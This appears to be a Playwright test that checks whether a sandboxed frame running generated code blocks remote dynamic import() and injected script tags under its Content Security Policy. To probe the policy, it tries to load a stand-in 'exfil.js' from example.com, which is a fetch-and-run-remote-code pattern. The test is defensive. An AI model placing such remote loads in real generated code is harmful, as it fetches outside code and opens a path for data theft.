import { test, expect } from "@playwright/test";

test("gate egress-import: remote dynamic import() and <script src> are blocked by CSP", async ({ page }) => {
  await page.goto("/fixtures/host.html?case=gen-code");
  await expect(page.locator("#stage-status")).toHaveText("ready", { timeout: 10_000 });

  const frameHandle = await page.$("#flowlet-stage");
  const frame = await frameHandle!.contentFrame();

  const importResult = await frame!.evaluate(async () => {
    try { await import("https://example.com/exfil.js"); return "allowed"; }
    catch { return "blocked"; }
  });
  expect(importResult).toBe("blocked");

  const scriptResult = await frame!.evaluate(() => new Promise<string>((res) => {
    const s = document.createElement("script");
    s.onload = () => res("allowed");
    s.onerror = () => res("blocked");
    s.src = "https://example.com/exfil.js";
    document.head.appendChild(s);
    setTimeout(() => res("blocked"), 3000);
  }));
  expect(scriptResult).toBe("blocked");
});
